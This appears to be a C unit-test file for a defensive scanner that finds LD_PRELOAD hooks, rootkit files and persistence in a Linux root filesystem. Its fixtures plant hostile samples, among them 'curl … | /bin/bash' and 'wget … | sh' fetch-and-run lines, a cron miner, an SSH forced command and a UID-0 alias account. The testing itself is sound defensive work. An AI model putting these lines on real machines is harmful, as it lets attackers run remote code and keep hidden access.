/**
 * @file test_preload_scanner.c
 * @brief Unit tests for userland LD_PRELOAD and PAM interceptor scanner.
 */
#include "test_framework.h"
#include "preload_scanner.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static char g_root[64];

static void make_root(void) {
    snprintf(g_root, sizeof(g_root), "/tmp/booto_preload_XXXXXX");
    if (!mkdtemp(g_root)) {
        perror("mkdtemp");
        exit(1);
    }
    char etc[96];
    snprintf(etc, sizeof(etc), "%s/etc", g_root);
    mkdir(etc, 0755);
}

static void write_etc_file(const char *name, const char *content) {
    char p[160];
    snprintf(p, sizeof(p), "%s/etc/%s", g_root, name);
    FILE *fp = fopen(p, "w");
    if (fp) {
        fputs(content, fp);
        fclose(fp);
    }
}

static void write_file(const char *rel, const char *content) {
    char p[256], cmd[512];
    snprintf(p, sizeof(p), "%s%s", g_root, rel);
    snprintf(cmd, sizeof(cmd), "mkdir -p \"$(dirname '%s')\"", p);
    if (system(cmd) != 0) return;
    FILE *fp = fopen(p, "w");
    if (fp) {
        fputs(content, fp);
        fclose(fp);
    }
}

static void remove_tree(void) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "rm -rf '%s'", g_root);
    if (system(cmd) != 0) perror("rm");
}

static void remove_root(void) {
    static const char *names[] = { "ld.so.preload", "environment" };
    char p[160];
    for (size_t i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
        snprintf(p, sizeof(p), "%s/etc/%s", g_root, names[i]);
        if (unlink(p) != 0) rmdir(p);
    }
    snprintf(p, sizeof(p), "%s/etc", g_root);
    rmdir(p);
    rmdir(g_root);
}

static void test_ld_preload_detection(void) {
    TEST_START("test_ld_preload_detection");
    make_root();
    write_etc_file("ld.so.preload", "/lib/x86_64-linux-gnu/libazazel.so\n");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_root();

    ASSERT_INT_EQ(err, BOOTO_OK, "Preload scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 1, "Must detect active LD_PRELOAD hook");
    ASSERT_STR_EQ(res.findings[0].target_library, "/lib/x86_64-linux-gnu/libazazel.so", "Library path");
    ASSERT_STR_EQ(res.findings[0].rule_id, "PRELOAD_ACTIVE_HOOK", "Rule ID");
    TEST_PASS("test_ld_preload_detection");
}

static void test_ld_preload_whitespace_tokens(void) {
    TEST_START("test_ld_preload_whitespace_tokens");
    make_root();
    write_etc_file("ld.so.preload", "a.so b.so\tc.so # comment d.so\n");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_root();

    ASSERT_INT_EQ(err, BOOTO_OK, "Preload scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 3, "Every whitespace-separated entry, none from the comment");
    ASSERT_STR_EQ(res.findings[0].target_library, "a.so", "First token");
    ASSERT_STR_EQ(res.findings[1].target_library, "b.so", "Second token");
    ASSERT_STR_EQ(res.findings[2].target_library, "c.so", "Tab-separated token");
    TEST_PASS("test_ld_preload_whitespace_tokens");
}

static void test_ld_preload_long_line(void) {
    TEST_START("test_ld_preload_long_line");
    make_root();
    char line[1024];
    memset(line, ' ', sizeof(line));
    memcpy(line, "/lib/one.so", 11);
    memcpy(&line[700], "/lib/two.so", 11);
    line[711] = '\0';
    write_etc_file("ld.so.preload", line);

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_root();

    ASSERT_INT_EQ(err, BOOTO_OK, "Preload scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 2, "Both entries of a >600-byte line must be reported");
    ASSERT_STR_EQ(res.findings[1].target_library, "/lib/two.so", "Entry past byte 600");
    TEST_PASS("test_ld_preload_long_line");
}

static void test_environment_ld_preload(void) {
    TEST_START("test_environment_ld_preload");
    make_root();
    write_etc_file("environment", "PATH=\"/usr/bin:/bin\"\n# LD_PRELOAD=/lib/commented.so\nLD_PRELOAD=/lib/evil.so\n");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_root();

    ASSERT_INT_EQ(err, BOOTO_OK, "Preload scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 1, "LD_PRELOAD in etc/environment must be detected");
    ASSERT_STR_EQ(res.findings[0].target_library, "/lib/evil.so", "Environment library");
    ASSERT_STR_EQ(res.findings[0].rule_id, "PRELOAD_ENV_HOOK", "Rule ID");
    TEST_PASS("test_environment_ld_preload");
}

static void test_unreadable_preload_is_error(void) {
    TEST_START("test_unreadable_preload_is_error");
    make_root();
    char p[160];
    snprintf(p, sizeof(p), "%s/etc/ld.so.preload", g_root);
    mkdir(p, 0755); // exists but read() fails with EISDIR, even as root

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_root();

    ASSERT_INT_EQ(err, BOOTO_ERR_IO, "Unreadable ld.so.preload must not report clean");
    TEST_PASS("test_unreadable_preload_is_error");
}

static void test_modprobe_install_hook(void) {
    TEST_START("test_modprobe_install_hook");
    make_root();
    write_file("/etc/modprobe.d/blacklist.conf",
               "install usb-storage /bin/true\n"
               "install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-pcm-oss\n"
               "# install x /tmp/commented\n"
               "options snd-hda-intel model=auto\n");
    write_file("/usr/lib/modprobe.d/evil.conf", "install e1000e /usr/bin/kworkerd --ignore-install\n");
    write_file("/etc/modprobe.d/chain.conf", "install loop /sbin/modprobe --ignore-install loop; /dev/shm/.x\n");
    write_file("/etc/modprobe.d/notconf.txt", "install foo /usr/bin/evil\n");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 2, "Only the foreign command and the temp-path chain are hooks");
    for (int i = 0; i < res.threats_detected; i++) {
        ASSERT_STR_EQ(res.findings[i].rule_id, "PERSIST_MODPROBE_INSTALL", "Rule ID");
        bool known = strcmp(res.findings[i].target_library, "/usr/bin/kworkerd") == 0 ||
                     strcmp(res.findings[i].target_library, "/sbin/modprobe") == 0;
        ASSERT_TRUE(known, "Target is the program the hook runs");
    }
    TEST_PASS("test_modprobe_install_hook");
}

static void test_udev_run_hook(void) {
    TEST_START("test_udev_run_hook");
    make_root();
    write_file("/etc/udev/rules.d/10-tty.rules",
               "ACTION==\"add\", ENV{MAJOR}==\"1\", RUN+=\"/bin/sh -c '/lib/sedexp/asedexpb'\"\n");
    write_file("/etc/udev/rules.d/99-tmp.rules", "SUBSYSTEM==\"net\", RUN{program}+=\"/var/tmp/.d/x\"\n");
    write_file("/usr/lib/udev/rules.d/60-vendor.rules",
               "ATTR{RUNTIME}==\"1\", RUN+=\"/bin/sh -c 'echo 1 > /sys/x'\"\n");
    write_file("/etc/udev/rules.d/70-ok.rules", "SUBSYSTEM==\"usb\", RUN+=\"/usr/bin/logger plugged\"\n");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 2, "Admin shell rule and temp-path rule; vendor sh -c and logger are fine");
    for (int i = 0; i < res.threats_detected; i++) {
        ASSERT_STR_EQ(res.findings[i].rule_id, "PERSIST_UDEV_RUN", "Rule ID");
        bool known = strcmp(res.findings[i].target_library, "/bin/sh") == 0 ||
                     strcmp(res.findings[i].target_library, "/var/tmp/.d/x") == 0;
        ASSERT_TRUE(known, "Target is the program the rule runs");
    }
    TEST_PASS("test_udev_run_hook");
}

static void test_merged_usr_not_doubled(void) {
    TEST_START("test_merged_usr_not_doubled");
    make_root();
    write_file("/usr/lib/modprobe.d/evil.conf", "install e1000e /usr/bin/kworkerd\n");
    char lib[96];
    snprintf(lib, sizeof(lib), "%s/lib", g_root);
    ASSERT_INT_EQ(symlink("usr/lib", lib), 0, "Create merged-usr symlink");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 1, "/lib -> usr/lib must not double-report");
    TEST_PASS("test_merged_usr_not_doubled");
}

static void test_persistence_sweep(void) {
    TEST_START("test_persistence_sweep");
    make_root();
    write_file("/etc/systemd/system/evil.service", "[Service]\nExecStart=/tmp/.x/kworker --daemon\n");
    write_file("/usr/lib/systemd/system/fetch.service",
               "[Service]\nExecStartPre=-/usr/bin/curl -s http://x/a | /bin/bash\n");
    write_file("/usr/lib/systemd/system/ok.service",
               "[Service]\nExecStart=/usr/sbin/tmpwatch /tmp\nPrivateTmp=yes\n");
    write_file("/etc/cron.d/job", "SHELL=/bin/sh\n*/5 * * * * root /dev/shm/miner\n0 1 * * * root /usr/bin/find /tmp -delete\n");
    write_file("/etc/rc.local", "wget -qO- http://x/s | sh\n");
    write_file("/etc/profile.d/ok.sh", ". \"$HOME/.cargo/env\"\nexport TMPDIR=/tmp\n");
    write_file("/root/.bashrc", "LD_PRELOAD=/usr/lib/libx.so\n");
    write_file("/home/alice/.profile", "/var/tmp/agent &\n");
    write_file("/home/alice/.ssh/authorized_keys",
               "command=\"/tmp/.b/sh\" ssh-ed25519 AAAA/tmp+key alice\nssh-ed25519 AAAA/./base64 bob\n");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    static const char *const want[][2] = {
        { "PERSIST_SYSTEMD_EXEC", "/tmp/.x/kworker" }, { "PERSIST_SYSTEMD_EXEC", "/usr/bin/curl" },
        { "PERSIST_CRON", "/dev/shm/miner" },          { "PERSIST_CRON", "" },
        { "PERSIST_SHELL_PROFILE", "/usr/lib/libx.so" }, { "PERSIST_SHELL_PROFILE", "/var/tmp/agent" },
        { "PERSIST_SSH_FORCED_COMMAND", "/tmp/.b/sh" },
    };
    ASSERT_INT_EQ(res.threats_detected, 7, "One finding per planted hook; vendor /tmp args, dotfiles and key base64 are fine");
    for (size_t w = 0; w < sizeof(want) / sizeof(want[0]); w++) {
        bool found = false;
        for (int i = 0; i < res.threats_detected; i++)
            found |= strcmp(res.findings[i].rule_id, want[w][0]) == 0 &&
                     strcmp(res.findings[i].target_library, want[w][1]) == 0;
        if (!found) printf("missing %s %s\n", want[w][0], want[w][1]);
        ASSERT_TRUE(found, "Expected hook reported with the program it runs");
    }
    TEST_PASS("test_persistence_sweep");
}

static void test_known_rootkit_files(void) {
    TEST_START("test_known_rootkit_files");
    make_root();
    write_file("/etc/libsystem.so", "ELF");
    write_file("/XxJynx/.keep", "");
    char link[128];
    snprintf(link, sizeof(link), "%s/XxJynx/jynx2.so", g_root);
    ASSERT_TRUE(symlink("/etc/passwd", link) == 0, "Plant symlink");
    write_file("/usr/lib/libsystem.so", "not an IOC path");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 2, "Only the two planted IOC paths are reported");
    bool kinsing = false, jynx = false;
    for (int i = 0; i < res.threats_detected; i++) {
        const preload_finding_t *f = &res.findings[i];
        kinsing |= strcmp(f->rule_id, "IOC_KINSING") == 0 && strcmp(f->target_library, "/etc/libsystem.so") == 0 &&
                   strcmp(f->sha256, "0000000000000000000000000000000000000000000000000000000000000000") != 0;
        /* A symlink is reported but never followed out of the target root (no hash, nothing to quarantine). */
        jynx |= strcmp(f->rule_id, "IOC_JYNX2") == 0 && f->target_library[0] == '\0';
    }
    ASSERT_TRUE(kinsing, "Kinsing libsystem.so reported and hashed");
    ASSERT_TRUE(jynx, "Jynx2 symlink reported without following it");
    TEST_PASS("test_known_rootkit_files");
}

static void test_yara_installed_programs(void) {
    TEST_START("test_yara_installed_programs");
    make_root();
    write_file("/usr/bin/ls", "\x7f" "ELF clean program");
    write_file("/usr/bin/notes.txt", "diamorphine is only mentioned in a text file");
    write_file("/tmp/.x/hidden", "\x7f" "ELF in a subfolder: diamorphine");
    write_file("/tmp/kit", "\x7f" "ELF hooks by diamorphine");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, 1, "Only the rootkit ELF directly in a swept folder is reported");
    ASSERT_STR_EQ(res.findings[0].rule_id, "BOOTO_YARA_LINUX_ROOTKIT_FAMILY", "Rule ID");
    ASSERT_INT_EQ(res.findings[0].severity, SEVERITY_HIGH, "Severity comes from the rule");
    ASSERT_TRUE(strstr(res.findings[0].file_path, "/tmp/kit") != NULL, "Path");
    TEST_PASS("test_yara_installed_programs");
}

static void test_account_triage(void) {
    TEST_START("test_account_triage");
    make_root();
    write_etc_file("passwd", "root:x:0:0:root:/root:/bin/bash\ntoor:x:00:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/bash\n");
    write_etc_file("shadow", "root:$y$j9T$abc:19000:0:99999:7:::\nbackup::19000:0:99999:7:::\ndaemon:*:19000::::::\n");
    write_etc_file("gshadow", "sudo:::alice\n");  /* empty group password is normal and must not be read as shadow */
    write_etc_file("sudoers", "Defaults env_reset\n%sudo ALL=(ALL:ALL) ALL\n");
    write_file("/etc/sudoers.d/90-cloud", "ubuntu ALL=(ALL) NOPASSWD: ALL\nops ALL=(ALL) NOPASSWD: /usr/bin/systemctl\n");
    write_file("/home/alice/.keep", "");
    write_file("/home/bob/.bash_history", "ls\n");
    char link[128];
    snprintf(link, sizeof(link), "%s/home/alice/.bash_history", g_root);
    ASSERT_INT_EQ(symlink("/dev/null", link), 0, "Plant history symlink");
    unsigned char wtmp[3 * 384];
    memset(wtmp, 'u', sizeof(wtmp));
    memset(wtmp + 384, 0, 384);  /* the middle record wiped */
    write_file("/var/log/wtmp", "");
    char wp[128];
    snprintf(wp, sizeof(wp), "%s/var/log/wtmp", g_root);
    FILE *fp = fopen(wp, "wb");
    ASSERT_TRUE(fp && fwrite(wtmp, 1, sizeof(wtmp), fp) == sizeof(wtmp), "Write wtmp");
    fclose(fp);

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    static const struct { const char *rule, *target; booto_severity_t sev; } want[] = {
        { "ACCT_UID0_ALIAS", "toor", SEVERITY_HIGH },
        { "ACCT_EMPTY_PASSWORD", "backup", SEVERITY_MEDIUM },
        { "ACCT_SUDO_NOPASSWD_ALL", "ubuntu", SEVERITY_MEDIUM },
        { "ACCT_WTMP_ZEROED", "1 zeroed record(s)", SEVERITY_HIGH },
        { "ACCT_HISTORY_DEVNULL", "/dev/null", SEVERITY_MEDIUM },
    };
    ASSERT_INT_EQ(res.threats_detected, 5, "root, locked accounts, gshadow, scoped NOPASSWD and real history are fine");
    for (size_t w = 0; w < sizeof(want) / sizeof(want[0]); w++) {
        bool found = false;
        for (int i = 0; i < res.threats_detected; i++)
            found |= strcmp(res.findings[i].rule_id, want[w].rule) == 0 &&
                     strcmp(res.findings[i].target_library, want[w].target) == 0 && res.findings[i].severity == want[w].sev;
        if (!found) printf("missing %s %s\n", want[w].rule, want[w].target);
        ASSERT_TRUE(found, "Expected account finding with its grade");
    }
    TEST_PASS("test_account_triage");
}

static void test_full_table_keeps_severity(void) {
    TEST_START("test_full_table_keeps_severity");
    make_root();
    char libs[MAX_PRELOAD_THREATS * 16 + 1] = "";
    for (int i = 0; i < MAX_PRELOAD_THREATS; i++) {
        char one[16];
        snprintf(one, sizeof(one), "/l%d.so ", i);
        strcat(libs, one);
    }
    write_etc_file("ld.so.preload", libs);
    write_file("/tmp/kit", "\x7f" "ELF hooks by diamorphine");

    preload_scan_result_t res;
    booto_error_t err = preload_scan_rootfs(g_root, &res);
    remove_tree();

    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
    ASSERT_INT_EQ(res.threats_detected, MAX_PRELOAD_THREATS, "Table full");
    ASSERT_INT_EQ(res.findings[MAX_PRELOAD_THREATS - 1].severity, SEVERITY_CRITICAL,
                  "A dropped YARA match must not regrade the last kept finding");
    TEST_PASS("test_full_table_keeps_severity");
}

int main(void) {
    printf("\n--- Running LD_PRELOAD & PAM Interceptor Tests ---\n");
    test_ld_preload_detection();
    test_ld_preload_whitespace_tokens();
    test_ld_preload_long_line();
    test_environment_ld_preload();
    test_unreadable_preload_is_error();
    test_modprobe_install_hook();
    test_udev_run_hook();
    test_merged_usr_not_doubled();
    test_persistence_sweep();
    test_known_rootkit_files();
    test_yara_installed_programs();
    test_full_table_keeps_severity();
    test_account_triage();
    TEST_SUMMARY();
    return 0;
}
